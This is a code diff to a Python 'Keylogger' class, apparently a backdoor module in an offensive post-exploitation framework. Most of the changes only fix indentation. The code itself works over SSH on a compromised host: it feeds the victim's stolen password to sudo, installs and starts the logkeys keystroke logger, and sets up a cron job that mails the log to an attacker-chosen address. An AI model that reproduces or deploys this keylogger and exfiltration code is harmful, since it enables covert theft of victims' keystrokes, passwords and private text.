@@ -10,22 +10,22 @@ class Keylogger(Backdoor):
         self.intro = GOOD + "Using keylogger auxiliary module"
         self.core = core
         self.options = {
-        	"email": Option("email", "False", "set to \"True\" to send reports over email", False),
+                "email": Option("email", "False", "set to \"True\" to send reports over email", False),
                 "address": Option("address", "example@example.com", "add email address", False),
 
-	        }
+                }
         self.allow_modules = True
-        self.enabled_modules = {}
         self.modules = {}
-	self.target = self.core.curtarget
+        self.help_text = INFO + "Installs logkeys and starts a listener, and gives the user the option to send the logs back to a specific email address."
+        self.target = self.core.curtarget
 
     def get_command(self):
-	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output ~/log.log")
+        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output ~/log.log")
 
     def do_exploit(self, args):
-	os.system('git clone https://github.com/kernc/logkeys')
+        os.system('git clone https://github.com/kernc/logkeys')
         self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S rm -rf logkeys/")
-	self.target.scpFiles(self, 'logkeys', True)
+        self.target.scpFiles(self, 'logkeys', True)
         self.target.ssh.exec_command("./logkeys/configure")
         time.sleep(10)
         print("Configuring...")
@@ -48,7 +48,7 @@ class Keylogger(Backdoor):
             self.target.ssh.exec_command("echo 'echo report | mail -A ~/log.log " + self.get_value("address") + "' > script.sh")
             self.target.ssh.exec_command("echo \"* * * * 0 echo password | sudo -S bash ~/script.sh\" >> mycron && crontab mycron && rm mycron")
             print("You will recieve an email(probably in spam) with your new keylogger report every hour.")
-	for mod in self.modules.keys():
+        for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit(self.get_command())
 
